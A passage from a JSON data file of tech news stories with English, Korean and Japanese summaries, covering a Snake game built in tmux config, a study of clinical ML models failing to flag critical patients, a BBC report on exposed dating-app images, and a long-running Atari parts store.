game logic in init.conf.\n\nInstead of recursively calling source-file, I could have done this with a recursive keybinding, but the end result is about the same. It might be faster to use keybindings, but you’d have to worry about the keys getting sent to the right session which isn’t something I have to do here.\n\nUnlike displaying the video, I would only need to change 1-2 pixels per update, instead of a whole frame worth. The only things that move are the head and tail of the snake and the location of the apple. Keeping track of this was a bit more challenging for the game logic, but for the display it just meant a few rename-window -t Y:=X commands.\n\nOne addition here is the ability to give the snake eyes, both because it’s cute, as well as differentiating the head and tail:\n\nIsn’t it adorable?\n\nThis could have been done just by changing the window-status-format of the window where the head was located, but I wanted to do this in a more tmux-y, declarative way. I ended up using the “marked pane” feature to do this. As the snake moved I would select the window that contained the head as the marked pane, and updated the format of each window to show eyes only if they were the marked window:\n\nset -g window-status-format '#[fg=colour0,bg=colour#{window_name}]#{?#{window_marked_flag},#{@eyes},  }'\n\nBefore I implemented this I thought I was going to need a complicated conditional to check the direction and swap between different eyes, but I realised that since the eyes will only change if the user gives input, I just need to set @eyes whenever the user presses a key that changes the direction.\n\nReading user input is something I knew would be easy, but even then I made it overly complicated. I used bind-key -n to add bindings that didn’t require the prefix first, and set those up for Up, Down, Left, and Right. Originally I had these setting a variable for the direction we needed to face, which I’d then read during the update and change the position. This would have required a conditional for each direction which is messy. Thankfully I realised the much easier thing to do: the arrow keys set @x_change and @y_change to 1, 0, or -1 depending on the direction. Then every update I just add the change to the position.\n\nThis also made it easier to validate the input—you don’t want to allow changing directly from left to right without first moving up or down. That’s as simple as ensuring @x_change or @y_change is zero before setting it:\n\nbind -n Left {\n  if -F '#{@x_change}' { } {\n    set -g @new_eyes ' :'\n    set -g @x_change -1\n    set -g @y_change 0\n  }\n}\n\nThe final part is implementing the game logic. Just so we’re super clear: the game logic is also just more tmux config. There’s no little program working out where the snake should go, it’s all done by tmux itself.\n\nI used the same approach I did for the sudoku solver: running send-keys to trigger keybindings back within tmux itself. In the end I only needed a single keybinding, which steps the game forward one iteration and schedules the next frame using run -d:\n\nbind G {\n  # game logic goes here!\n\n  run -C \"run -d '#{@speed}' -bC 'send-keys -t $0 C-b G'\"\n}\n\nBy setting the delay on run with a variable, I could easily increase the speed of the game as more apples were eaten. In theory any tmux session could handle the key binding—they’re all on the same server—but I decided to play it safe and always target the outermost session.\n\nOnce we’ve got a function that’ll be called on each update, all we need to do is move the head of the snake in the right direction, move the end of the snake, and check whether we’ve eaten an apple.\n\nset -Fg @head_x '#{e|%:#{e|+:#{@head_x},#{@x_change}},#{@width}}'\nset -Fg @head_y '#{e|%:#{e|+:#{@head_y},#{@y_change}},#{@height}}'\n\nif -F '#{e|<:#{@head_x},0}' {\n  set -Fg @head_x \"#{e|+:#{@head_x},#{@width}}\"\n}\nif -F '#{e|<:#{@head_y},0}' {\n  set -Fg @head_y \"#{e|+:#{@head_y},#{@height}}\"\n}\n\nThis first section moves the head, stored as a separate variable to the rest of the body so it’s easier to keep track of and handle collisions. As I mentioned before the key inputs just set @x_change and @y_change so all I had to do here is add them to the head position. To allow wrapping around the screen I modulo them, which requires a second step as the modulo operator will leave negative numbers.\n\nIn order to support collisions (where the snake eats itself) I needed to keep track of the body positions. It’s difficult to get the name of a particular window, so I keep track of this separately to the actual display.\n\nWhat I really need is an array, but tmux doesn’t have those. Instead, each segment is stored as a fixed-length string with known delimiters, so .12 :=5  . would correspond to row 12 and column 5.\n\nset -F @len \"#{e|*:#{@length},10}\"\nset -Fg @body '#{E:##{=#{@len}:@body#}}'\n# later we prepend the head position onto the body\nset -Fg @body '.#{p3:@head_y}:=#{p3:@head_x}.#{@body}'\n\nTo remove the last segment, I use the string length-limit operator and double-expand it to allow using a variable as the length. I store the number of segments in @length, and since the string for each segment is fixed length, I just need to multiply this by 10.\n\nThe delimiters are added on either side to make it easier to do a substring match without running into false positives. I build a string out of the @head_x and @head_y, and if that’s found in the @body then the snake has eaten itself, and the game is over.\n\nif -F '#{m:*.#{p3:@head_y}:=#{p3:@head_x}.*,#{@body}}' {\n  display-menu -x C -y C -c /dev/pts/0 \\\n    -T ' Game over! score: #{e|-:#{@length},3} ' \\\n    'quit' q {\n      kill-server\n    }\n}\n\n@body is convenient for collisions, but not for moving the tail of the snake. For that I—very wastefully—set a new variable that tells me which window needs to be reverted back to the default colour at which step. By keeping track of the length of the snake and how many iterations there have been, I just lookup what the position was N steps ago, and swap that square back.\n\nset -Fg @step \"#{e|+:#{@step},1}\"\nrun -C \"set -g '@body_#{@step}' '#{@head_y}:=#{@head_x}'\"\n\nThese variables are formatted as a window selector—with the := in the middle—so they can be passed to rename-window with a double expansion to do the indirection:\n\nrun -C 'set @var \"@body_#{e|-:#{@step},#{@length}}\"'\nrun -C 'rename-window -t \"#{E:##{#{@var}#}}\" \"\"'\n\nDuring the update we need to toggle the colour for the head. This only needs to be done once as it’ll remain the same colour until we toggle it back. For the eyes to show on the head, I set the same window as the marked pane. Only one pane can be marked at a time so I don’t have to un-set this.\n\nrun -C \"rename-window -t #{@head_y}:=#{@head_x} 2\"\nrun -C \"select-pane -t #{@head_y}:=#{@head_x} -m\"\n\nHere’s the important bit: checking whether we’ve eaten an apple. A simple string match on the x/y-coordinates enough. Then increase the speed and length.\n\nI couldn’t think of a proper random number generator within tmux, but thankfully there are plenty of variables in the FORMATS section that’ll give us some random-enough numbers, especially if we combine them with the current step number. I ended up going with client_written which I assume will increase somewhat regularly as escape sequences and whatnot are written to the terminal. From my play-testing this was good enough.\n\nif -F '#{&&:#{==:#{@apple_y},#{@head_y}},#{==:#{@apple_x},#{@head_x}}}' {\n  set -Fg @speed \"#{e|*|f|2:#{@speed},0.8}\"\n  set -Fg @length \"#{e|+:#{@length},1}\"\n\n  set -F @seed \"#{e|+:#{client_written},#{@step}}\"\n  set -F @var \"#{e|%:#{@seed},#{@width}}\"\n  set -Fg @apple_x '#{@var}'\n  set -F @var \"#{e|%:#{@seed},#{@height}}\"\n  set -Fg @apple_y '#{@var}'\n}\n\nThe last job of the update function is to schedule the next update—if we haven’t ended the game—and then it all happens again. Unlike playing video, where you want as many updates per second as possible, tmux is able to keep up with this reasonably well.\n\nBelieve it or not, the entire implementation is written by hand, and is fewer lines than my actual real-world tmux config—140 versus 192. All you need to play it is tmux, around version 3.4 or so. Grab the code from here and give it a go!",
    "summary": {
      "en": "**Summary: Building Snake in tmux Config File**\n\nOn March 20, 2025, a developer created a version of the Snake game entirely within a tmux configuration file, without using any external programs. This means you can simply load the configuration into tmux to play the game.\n\nKey Features:\n- The game includes all elements like input, logic, and display, handled through tmux's config files.\n- The display is managed using multiple tmux sessions that update based on window names and colors.\n- The developer used hooks and commands within tmux to create and manage game sessions and windows, allowing for dynamic resizing and game state updates.\n\nGame Mechanics:\n- The snake's head and tail are tracked separately, and players control movement using arrow keys.\n- The game logic, including collision detection and apple consumption, is also managed through tmux commands.\n- To enhance the game visually, the snake's head is given \"eyes\" for distinction, which updates based on user input.\n\nOverall, the implementation is compact, consisting of fewer lines than a typical tmux config, and can be played using tmux version 3.4 or later. The developer encourages others to try out the code.",
      "ko": "2025년 3월 20일, 한 개발자가 tmux 설정 파일 내에서 외부 프로그램 없이 완전히 독립적인 스네이크 게임 버전을 만들었습니다. 이 설정 파일을 tmux에 로드하기만 하면 게임을 즐길 수 있습니다.\n\n게임의 주요 특징은 입력, 로직, 디스플레이 등 모든 요소가 tmux의 설정 파일을 통해 처리된다는 점입니다. 디스플레이는 여러 tmux 세션을 사용하여 관리되며, 각 세션은 창 이름과 색상에 따라 업데이트됩니다. 개발자는 tmux 내의 훅과 명령어를 활용해 게임 세션과 창을 생성하고 관리하여, 동적으로 크기를 조정하고 게임 상태를 업데이트할 수 있도록 했습니다.\n\n게임의 메커니즘은 뱀의 머리와 꼬리를 각각 추적하며, 플레이어는 화살표 키를 사용해 움직임을 조정합니다. 충돌 감지와 사과 소비를 포함한 게임 로직 역시 tmux 명령어를 통해 관리됩니다. 시각적으로 게임을 향상시키기 위해 뱀의 머리에 \"눈\"을 추가하여 구별할 수 있도록 했으며, 이는 사용자 입력에 따라 업데이트됩니다.\n\n전체적으로 이 구현은 일반적인 tmux 설정보다 적은 줄로 구성되어 있으며, tmux 버전 3.4 이상에서 플레이할 수 있습니다. 개발자는 다른 사람들도 이 코드를 시도해 보기를 권장하고 있습니다.",
      "ja": "2025年3月20日、ある開発者がtmuxの設定ファイル内で完全に動作するスネークゲームのバージョンを作成しました。このゲームは外部プログラムを使用せず、tmuxの設定を読み込むだけでプレイできます。\n\nこのゲームの主な特徴は、入力、ロジック、表示などのすべての要素がtmuxの設定ファイルを通じて処理されていることです。表示は、ウィンドウ名や色に基づいて更新される複数のtmuxセッションを使用して管理されています。開発者は、ゲームセッションやウィンドウを作成・管理するためにtmuxのフックやコマンドを利用し、動的なサイズ変更やゲーム状態の更新を可能にしています。\n\nゲームの仕組みとしては、スネークの頭と尾が別々に追跡され、プレイヤーは矢印キーを使って移動を制御します。衝突検知やリンゴの消費などのゲームロジックもtmuxのコマンドを通じて管理されています。視覚的な楽しさを増すために、スネークの頭には「目」が付けられ、ユーザーの入力に応じて更新されます。\n\n全体的に、この実装はコンパクトで、通常のtmux設定ファイルよりも行数が少なく、tmuxのバージョン3.4以降でプレイ可能です。開発者は他の人にもこのコードを試してみるよう呼びかけています。"
    }
  },
  {
    "id": "bf46fb3faa61e34d",
    "title": {
      "en": "Apple losing over $1B a year on streaming service",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.reuters.com/technology/apple-losing-over-1-billion-year-streaming-service-information-reports-2025-03-20/",
    "score": 26,
    "by": "mgh2",
    "time": 1743289898,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "f1113cdf8736f233",
    "title": {
      "en": "Low responsiveness of ML models to critical or deteriorating health conditions",
      "ko": "위험 신호 무시하는 ML 모델",
      "ja": "健康危機に鈍感なMLモデル"
    },
    "type": "story",
    "url": "https://www.nature.com/articles/s43856-025-00775-0",
    "score": 82,
    "by": "PaulHoule",
    "time": 1743000217,
    "content": "Download PDF\n\n        Article\n\n            Open access\n\n                        Published: 11 March 2025\n\n                    Low responsiveness of machine learning models to critical or deteriorating health conditions\n                    Tanmoy Sarkar Pias1, Sharmin Afrose2, Moon Das Tuli3, Ipsita Hamid Trisha4,5, Xinwei Deng6, Charles B. Nemeroff7 & …Danfeng Daphne Yao\n            ORCID: orcid.org/0000-0001-8969-27921Show authors\n\n    Communications Medicine\n\n                        volume5, Articlenumber:62 (2025)\n            Cite this article\n\n                        7580 Accesses\n\n                            394 Altmetric\n\n                    Metrics details\n\n            AbstractBackgroundMachine learning (ML) based mortality prediction models can be immensely useful in intensive care units. Such a model should generate warnings to alert physicians when a patient’s condition rapidly deteriorates, or their vitals are in highly abnormal ranges. Before clinical deployment, it is important to comprehensively assess a model’s ability to recognize critical patient conditions.MethodsWe develop multiple medical ML testing approaches, including a gradient ascent method and neural activation map. We systematically assess these machine learning models’ ability to respond to serious medical conditions using additional test cases, some of which are time series. Guided by medical doctors, our evaluation involves multiple machine learning models, resampling techniques, and four datasets for two clinical prediction tasks.ResultsWe identify serious deficiencies in the models’ responsiveness, with the models being unable to recognize severely impaired medical conditions or rapidly deteriorating health. For in-hospital mortality prediction, the models tested using our synthesized cases fail to recognize 66% of the injuries. In some instances, the models fail to generate adequate mortality risk scores for all test cases. Our study identifies similar kinds of deficiencies in the responsiveness of 5-year breast and lung cancer prediction models.ConclusionsUsing generated test cases, we find that statistical machine-learning models trained solely from patient data are grossly insufficient and have many dangerous blind spots. Most of the ML models tested fail to respond adequately to critically ill patients. How to incorporate medical knowledge into clinical machine learning models is an important future research direction.Plain language summary\n\n              Computational models can be used to evaluate a patient’s health condition and predict their risk of dying, for example, in the intensive care unit. These models could be useful to identify patients with worsening health conditions and alert doctors promptly. We test how well several computational models recognize patients with serious or worsening health conditions. We find most of the computational models evaluated cannot recognize critical health events in our tests, which is concerning. Our work highlights the importance of using medical knowledge guided testing to ensure models are suitable, as well as the need to incorporate fundamental medical knowledge into the design of such models.\n\n                Similar content being viewed by others\n\n                                        Using machine learning tools to predict outcomes for emergency department intensive care unit patients\n\n                                        Article\n                                         Open access\n                                         01 December 2020\n\n                                        Development of a machine learning-based clinical decision support system to predict clinical deterioration in patients visiting the emergency department\n\n                                        Article\n                                         Open access\n                                         26 May 2023\n\n                                        Mortality prediction of patients in intensive care units using machine learning algorithms based on electronic health records\n\n                                        Article\n                                         Open access\n                                         03 May 2022\n\n                window.dataLayer = window.dataLayer || [];\n                window.dataLayer.push({\n                    recommendations: {\n                        recommender: 'semantic',\n                        model: 'specter',\n                        policy_id: 'NA',\n                        timestamp: 1743298221,\n                        embedded_user: 'null'\n                    }\n                });\n\n                        IntroductionThe Food Drug Administration authorized the first autonomous artificial intelligence (AI) diagnostic system in 2018, which is for detecting diabetic retinopathy1. Since then, AI machine learning (ML) based predictive technologies are rapidly made available for incorporation into clinical workflows2, e.g., for early sepsis detection3 and predicting surgery time4. However, recent studies revealed problems of prediction models under various medical scenarios, e.g., missed detection in mortality prediction or cancer prognosis5, poor sepsis forecast by a popular U.S. electronic health record software system Epic6, and models creating incorrect predictive shortcuts for image-based skin cancer detection7.These findings point out the urgent need for systematic model evaluation before their clinical adoption to ensure trustworthiness8. For example, for in-hospital mortality (IHM) prediction, it is important to measure whether or not ML models can promptly respond to deteriorating patients’ conditions. However, due to the immense complexity of the input space, model evaluation is challenging. Exhaustive testing is both unnecessary and impossible in most medical AI applications.The current ML testing practice is very limited in terms of the coverage of disease conditions. Existing model testing is largely restricted to a small percentage (10-15%) of the existing dataset, i.e., test set, as the bulk of the data is reserved for training. Because data imbalance in medicine is common, a typical test set likely has a low coverage of various critical medical conditions and minority prediction class cases. For example, the minority prediction class (i.e., death class) only accounts for 13.5% of an IHM prediction dataset5. Even with cross-validation and bootstrapping, the test set is largely limited to the original data.As a result of the limited test sets, predictive models may be under-evaluated. How they respond to real-world scenarios may be insufficiently assessed. During clinical deployment, new patient conditions could occur out of the distribution of the test set, triggering unexpected failures, e.g., the model failing to produce high enough risk scores for critically ill patients. This issue may disproportionately impact the smaller prediction class, as a typical data-driven model aims to prioritize the accuracy of the majority class samples during training5. One approach for increasing test coverage is to use synthetic test samples. Recently, generative technologies have been proposed to produce curated manmade images for testing self-driving vehicles9,10. However, image-based solutions do not address the unique temporal challenge in medical time-series applications.In this work, we develop systematic approaches for generating new test cases beyond the original dataset to assess the responsiveness of ML models to critical health conditions that may occur in clinical settings. Our test case generation is guided by domain knowledge and medical experts. Our experiments involve binary classification tasks, including time-series-based IHM prediction and 5-year breast and lung cancer survivability (LCS) prognosis (Fig.1). We develop multiple methods for generating high-risk test cases that do not exist in the training data or are underrepresented in the training set. Our solutions can process time series data, which is pervasive in medicine. We also conduct interviews with medical experts to obtain their estimated risks on some of the generated test cases. Our work reveals alarming prediction deficiencies of ML models and points out that ML responsiveness is an important aspect of trustworthiness in digital health.Fig. 1: Number of generated test cases for evaluating models trained on in-hospital mortality risk prediction and 5-year cancer survivability prediction models.The left side illustrates the generated test case of each category for testing in-hospital mortality risk prediction models trained on MIMIC III or eICU dataset. The right side represents the generated test cases to test 5-year breast cancer survivability (BCS) prediction models. The SEER lung cancer survivability (LCS) models are tested similarly using the single-attribute test cases.Full size imageMethodsPrediction tasks, datasets, and model selectionOur work aims to test medical ML models for their binary classification accuracy under serious disease conditions. We focus on three binary prediction tasks, namely 48-h IHM risk prediction, 5-year breast cancer survivability (BCS) prediction, and 5-year LCS prediction.The datasets in our study include a 2019 benchmark11 based on the MIMIC III12,13 dataset, a 2020 benchmark14 based on the eICU15 dataset, and a 2018 reproducibility benchmark16 based on the Surveillance, Epidemiology, and End Results (SEER) (5-year breast and lung cancer) dataset16. The first two datasets contain patients’ 48-h time series data in critical care units (ICU). Our study excludes clinical free text notes. As with many medical datasets, the MIMIC-III dataset for IHM, containing 21,139 samples, is imbalanced, with 13.2% death cases (Class 1), and 86.8% non-death cases (Class 0). The eICU IHM benchmark dataset contains a total of 30,681 (88.5% for Class 0 and 11.5% for Class 1) samples with similar attributes and time lengths to the MIMIC III benchmark14. Supplementary Fig.S1 shows the distributions of key attributes of both MIMIC III and eICU datasets. The SEER BCS dataset contains 248,751 patient cases with 56 attributes (7 numerical and continuous features and 49 categorical). In the SEER BCS dataset, 12.7% of cases are death cases (Class 0); the rest are survived cases (Class 1). Supplementary Fig.S2 shows the distributions of key attributes. The SEER LCS dataset contains 205,555 cases with 47 features (7 numerical and continuous features and 40 categorical). 84% of patients died in the LCS dataset.The creation of the MIMIC-III dataset was approved by the Institutional Review Boards of Beth Israel Deaconess Medical Center (Boston, MA) and the Massachusetts Institute of Technology (Cambridge, MA). Because sensitive health information was de-identified and the dataset did not impact clinical care, the requirement for individual patient consent was waived. The eICU dataset creation is exempt from institutional review board approval due to the retrospective design, lack of direct patient intervention, and the security schema, for which the re-identification risk was certified as meeting safe harbor standards by an independent privacy expert (Privacert, Cambridge, MA) (Health Insurance Portability and Accountability Act Certification no. 1031219-2). The SEER Program dataset is managed and maintained by the National Cancer Institute (NCI) in the United States. The centralized data collection system enables central IRB submission and approval through reliance agreements with registries. The SEER data collected by registries under state public health reporting authority is HIPAA exempt. MIMIC III is freely available through a proper request to the data source (https://physionet.org/content/mimiciii/1.4/). It requires a license (PhysioNet Credentialed Health Data License 1.5.0), Data Use Agreement (PhysioNet Credentialed Health Data Use Agreement 1.5.0), a training (CITI Data or Specimens Only Research). The eICU dataset can also be accessed (https://physionet.org/content/eicu-crd/2.0/) by completing these mentioned steps. The SEER dataset is also freely available through a proper request to the data source (https://seer.cancer.gov/). It requires the Data Application Form, Data User Agreement, and Acknowledgment of Data Limitations (https://seer.cancer.gov/data/product-comparison.html). The data was accessed through an eRA Commons account, and the data cohort was selected using SEER*Stat software. We gained access to the datasets following the various routes described above. All these datasets are de-identified and public. Thus, an IRB approval is not required for this study, specifically the analysis of de-identified and publicly available data does not constitute human subjects research (U.S. Federal Regulations 45 CFR 46.102).We select ML models that are commonly used in the medical literature for these prediction tasks. Specifically, we select long short term memory (LSTM) as it is widely used for predicting mortality risk in a 48-h ICU time series dataset—in recent literature5,17,18,19. Similarly, for cancer survivability prediction, we selected multi-layer perceptron (MLP), which was commonly used in analyzing SEER datasets5,16,20. In addition, we also evaluated general-purpose ML models commonly seen in medical literature, including XGBoost, AdaBoost, random forest, Gaussian Naive Bayes, and K-nearest Neighbor (KNN). For mortality prediction, we also include channel-wise long short term memory (CW-LSTM) and linear logistic regression (LR) models from the benchmark study11 and an advanced transformer model.Dataset preprocessingWe train ML models with benchmark datasets of MIMIC-III11, eICU14, and SEER breast and LCS studies16, following the conventional pre-training process",
    "summary": {
      "en": "The article discusses the effectiveness of machine learning (ML) models in predicting critical health conditions, particularly in intensive care units (ICUs). Researchers found that many existing ML models struggle to recognize deteriorating health situations, which is concerning for patient safety. \n\nKey points include:\n\n1. **Purpose of ML Models**: These models aim to predict patient mortality and alert healthcare providers when a patient's condition worsens.\n\n2. **Study Findings**: The study revealed that the models tested failed to identify 66% of critical injuries and often produced insufficient mortality risk scores. This indicates that many models have significant limitations in recognizing severe health crises.\n\n3. **Methodology**: The researchers developed various testing methods using synthetic test cases to evaluate the models better. They emphasized the importance of integrating medical expertise into the design of these models for more reliable predictions.\n\n4. **Conclusion**: The study highlights urgent needs for improved testing practices and better incorporation of medical knowledge into ML models to enhance their responsiveness to critical health conditions, ensuring they can effectively assist in clinical settings.",
      "ko": "이 기사는 중환자실에서 기계 학습(ML) 모델이 중대한 건강 상태를 예측하는 데 얼마나 효과적인지를 다루고 있습니다. 연구자들은 많은 기존 ML 모델이 악화되는 건강 상황을 인식하는 데 어려움을 겪고 있어 환자 안전에 대한 우려가 커지고 있다고 밝혔습니다.\n\nML 모델의 주요 목적은 환자의 사망 가능성을 예측하고 환자의 상태가 악화될 때 의료 제공자에게 경고하는 것입니다. 연구 결과, 테스트된 모델들은 66%의 중대한 부상을 식별하지 못했으며, 종종 불충분한 사망 위험 점수를 생성했습니다. 이는 많은 모델이 심각한 건강 위기를 인식하는 데 상당한 한계를 가지고 있음을 나타냅니다.\n\n연구자들은 모델을 더 잘 평가하기 위해 합성 테스트 사례를 사용하여 다양한 테스트 방법을 개발했습니다. 그들은 이러한 모델의 설계에 의료 전문 지식을 통합하는 것이 신뢰할 수 있는 예측을 위해 중요하다고 강조했습니다.\n\n이 연구는 중대한 건강 상태에 대한 반응성을 향상시키기 위해 개선된 테스트 관행과 의료 지식의 더 나은 통합이 시급하다는 점을 강조합니다. 이는 임상 환경에서 효과적으로 도움을 줄 수 있도록 하는 데 필요합니다.",
      "ja": "この記事では、機械学習（ML）モデルが集中治療室（ICU）における重要な健康状態の予測にどれほど効果的かについて議論されています。研究者たちは、多くの既存のMLモデルが健康状態の悪化を認識するのに苦労していることを発見しました。これは患者の安全にとって懸念材料です。\n\nMLモデルの目的は、患者の死亡リスクを予測し、患者の状態が悪化した際に医療提供者に警告を発することです。研究の結果、テストされたモデルは、重篤な傷害の66%を特定できず、しばしば不十分な死亡リスクスコアを生成することが明らかになりました。これは、多くのモデルが深刻な健康危機を認識する上で大きな限界を持っていることを示しています。\n\n研究者たちは、モデルをより良く評価するために、合成テストケースを用いたさまざまなテスト方法を開発しました。彼らは、より信頼性の高い予測を行うためには、これらのモデルの設計に医療の専門知識を統合することが重要であると強調しています。\n\nこの研究は、重要な健康状態に対する応答性を高めるために、改善されたテスト手法と医療知識のより良い統合が急務であることを浮き彫りにしています。これにより、臨床現場で効果的に支援できるようになることが期待されています。"
    }
  },
  {
    "id": "9184928152a18da9",
    "title": {
      "en": "Kink and LGBT dating apps exposed 1.5M private user images online",
      "ko": "성소수자 앱, 150만 사용자 이미지 유출!",
      "ja": "LGBTアプリ流出1.5M画像"
    },
    "type": "story",
    "url": "https://www.bbc.com/news/articles/c05m5m5v327o",
    "score": 4,
    "by": "testrun",
    "time": 1743297091,
    "content": "Kink and LGBT dating apps exposed 1.5m private user images online2 hours agoShareSaveJoe TidyCyber correspondent, BBC World ServiceShareSaveChica AppSugar daddy dating app Chica is one of five apps with unprotected user images Researchers have discovered nearly 1.5 million pictures from specialist dating apps – many of which are explicit – being stored online without password protection, leaving them vulnerable to hackers and extortionists.Anyone with the link was able to view the private photos from five platforms developed by M.A.D Mobile: kink sites BDSM People and Chica, and LGBT apps Pink, Brish and Translove.These services are used by an estimated 800,000 to 900,000 people.M.A.D Mobile was first warned about the security flaw on 20th January but didn't take action until the BBC emailed on Friday.They have since fixed it but not said how it happened or why they failed to protect the sensitive images.This is one of the photos that anyone could have accessed. We have cropped the face and blurred it to enhance privacyEthical hacker Aras Nazarovas from Cybernews first alerted the firm about the security hole after finding the location of the online storage used by the apps by analysing the code that powers the services.He was shocked that he could access the unencrypted and unprotected photos without any password.\"The first app I investigated was BDSM People, and the first image in the folder was a naked man in his thirties,\" he said. \"As soon as I saw it I realised that this folder should not have been public.\"The images were not limited to those from profiles, he said – they included pictures which had been sent privately in messages, and even some which had been removed by moderators.Hacking riskMr Nazarovas said the discovery of unprotected sensitive material comes with a significant risk for the platforms' users.Malicious hackers could have found the images and extorted individuals.There is also a risk to those who live in countries hostile to LGBT people.None of the text content of private messages was found to be stored in this way and the images are not labelled with user names or real names, which would make crafting targeted attacks at users more complex.In an email M.A.D Mobile said it was grateful to the researcher for uncovering the vulnerability in the apps to prevent a data breach from occurring. But there's no guarantee that Mr Nazarovas was the only hacker to have found the image stash.\"We appreciate their work and have already taken the necessary steps to address the issue,\" a M.A.D Mobile spokesperson said. \"An additional update for the apps will be released on the App Store in the coming days.\"The company did not respond to further questions about where the company is based and why it took months to address the issue after multiple warnings from researchers.Usually security researchers wait until a vulnerability is fixed before publishing an online report, in case it puts users at further risk of attack. But Mr Nazarovas and his team decided to raise the alarm on Thursday while the issue was still live as they were concerned the company was not doing anything to fix it.\"It's always a difficult decision but we think the public need to know to protect themselves,\" he said.In 2015 malicious hackers stole a large amount of customer data about users of Ashley Madison, a dating website for married people who wish to cheat on their spouse.Ashley Madison client data 'leaked'The hackers taking the bugs to the bank'Sensitive' army papers found scattered in streetDating appsLGBTOnline datingTechnology",
    "summary": {
      "en": "A recent investigation revealed that nearly 1.5 million private images from five dating apps, including kink and LGBT platforms, were stored online without password protection, making them accessible to anyone with the link. The apps involved are BDSM People, Chica, Pink, Brish, and Translove, which together serve around 800,000 to 900,000 users.\n\nThe issue was first reported to M.A.D Mobile, the developer, in January, but they did not act until alerted by the BBC. Although the security flaw has since been fixed, the company has not explained how it occurred. Ethical hacker Aras Nazarovas discovered the vulnerability while examining the apps' code and was alarmed by the lack of security protecting sensitive images.\n\nThe unprotected images included explicit photos and private messages, raising concerns about potential extortion and risks for users in countries where LGBT individuals face persecution. M.A.D Mobile acknowledged the issue and assured that they are taking steps to improve security. However, it remains unclear why they delayed action for months. The incident highlights the ongoing risks associated with online dating and data security.",
      "ko": "최근 조사에 따르면, BDSM People, Chica, Pink, Brish, Translove 등 다섯 개의 데이팅 앱에서 약 150만 개의 개인 이미지가 비밀번호 보호 없이 온라인에 저장되어 있어, 링크만 있으면 누구나 접근할 수 있는 상황이었다. 이 앱들은 총 80만에서 90만 명의 사용자에게 서비스를 제공하고 있다.\n\n이 문제는 1월에 M.A.D Mobile 개발사에 처음 보고되었지만, BBC의 경고를 받은 후에야 조치를 취했다. 보안 결함은 이미 수정되었지만, 회사는 이 문제가 어떻게 발생했는지에 대한 설명을 하지 않았다. 윤리 해커인 아라스 나자로바스는 앱의 코드를 검사하던 중 이 취약점을 발견했으며, 민감한 이미지를 보호하는 보안이 부족한 것에 대해 우려를 표했다.\n\n보호되지 않은 이미지에는 노골적인 사진과 개인 메시지가 포함되어 있어, LGBT 개인이 박해를 받는 국가에서 사용자들이 겪을 수 있는 잠재적인 갈취와 위험에 대한 우려가 커지고 있다. M.A.D Mobile은 문제를 인정하고 보안 개선을 위한 조치를 취하고 있다고 밝혔지만, 왜 몇 달 동안 조치를 미뤘는지는 여전히 불확실하다. 이번 사건은 온라인 데이팅과 데이터 보안에 관련된 지속적인 위험을 부각시키고 있다.",
      "ja": "最近の調査によると、BDSM People、Chica、Pink、Brish、Transloveの5つのデーティングアプリから、約150万枚のプライベート画像がパスワードなしでオンラインに保存されており、リンクを知っている人なら誰でもアクセスできる状態でした。これらのアプリは、約80万から90万人のユーザーに利用されています。\n\nこの問題は1月にアプリの開発者であるM.A.D Mobileに報告されましたが、BBCからの指摘があるまで対応が行われませんでした。セキュリティの欠陥は修正されたものの、その原因については説明されていません。倫理的ハッカーのアラス・ナザロバスは、アプリのコードを調査している際にこの脆弱性を発見し、敏感な画像を保護するセキュリティが欠如していることに驚きました。\n\n無防備な画像には露骨な写真やプライベートメッセージが含まれており、LGBTの人々が迫害を受ける国々におけるユーザーのリスクや恐喝の可能性について懸念が高まっています。M.A.D Mobileは問題を認め、セキュリティ向上に向けた対策を講じているとしていますが、なぜ数ヶ月も行動を遅らせたのかは不明です。この事件は、オンラインデーティングとデータセキュリティに伴うリスクが依然として存在することを浮き彫りにしています。"
    }
  },
  {
    "id": "ad1f0993cd968b5c",
    "title": {
      "en": "U.S. Atari parts store still open after 41 years, spent $100K+ designing parts",
      "ko": "41년째 운영 중인 아타리 부품 가게",
      "ja": "アメリカのアタリ、41年の歴史！"
    },
    "type": "story",
    "url": "https://www.tomshardware.com/video-games/retro-gaming/u-s-atari-parts-store-still-open-after-41-years-has-spent-usd100k-designing-new-parts-last-original-atari-hardware-launched-32-years-ago",
    "score": 8,
    "by": "wojtczyk",
    "time": 1743294222,
    "content": "Video Games\n\nRetro Gaming\n\nU.S. Atari parts store still open after 41 years, has spent $100K+ designing new parts — last original Atari hardware launched 32 years ago\n\nNews\n\nBy\nMark Tyson\n\npublished\nMarch 16, 2025\n\nStocks go well beyond the 5,000+ 'popular items' the store lists for sale.\n\nComments (3)\n\nWhen you purchase through links on our site, we may earn an affiliate commission. Here’s how it works.\n\nwindow.vanilla.infiniteArticlesData = [];\n\n(Image credit: Best Electronics)\n\nAtari parts and accessories store Best Electronics stands bravely defiant against the march of time and technology, continuing to serve this increasingly niche retro hardware market — a whopping 41 years after it was set up.As well as supplying parts, the store continues to source and make new parts, provide support, hints, and tips, and claims to have spent $100,000+ in engineering development. In contrast, the iconic and innovative Atari Corp. behind all the firm's home computers, and advanced consoles like the Lynx and Jaguar, went bankrupt in 1996, almost 30 years ago.Many readers and writers here on Tom's Hardware will have grown up with Atari computers and consoles. Thus it's admirable to see exclusive new and upgraded parts like rubber domes for your ST / STE / Falcon computer keyboard and all Gold PCB boards for your CX series joysticks, plus lots of other parts, continue to be manufactured and supplied to Atari fans.\n\nYou may like\n\nCES 2025 is the 40th anniversary of the Commodore 128 — the last 8-bit PC first appeared at CES 1985\n\nMaker resurrects Toshiba T1000 with a Raspberry Pi 4 and a slew of upgrades\n\nThe retailer also stocks \"a lifetime supply\" of new-old products in some categories. Interestingly, it reveals many of these were warehoused from the \"thousands and thousands of pallets of Atari goods\" it bought when Atari Sunnyvale was liquidated.\n    if (window.sliceHydrationLazy) {\n        window.sliceHydrationLazy(\"imageGallery-FnMgufN6kTGV9FcM3gG2Pf-dhleXOFvXFKEpRhRqDjyJwxGD8sDWGuE\", \"imageGallery\", JSON.stringify({\"galleryData\":[{\"title\":\"\",\"description\":[],\"image\":{\"id\":\"UTiNNYXxefNJi6Lq79Ns7h\",\"name\":\"catalog-sample\",\"credit\":{\"text\":\"(Image credit: {subject})\",\"subject\":\"<a href=\\\"https:\\/\\/www.best-electronics-ca.com\\/\\\" target=\\\"_blank\\\">Best 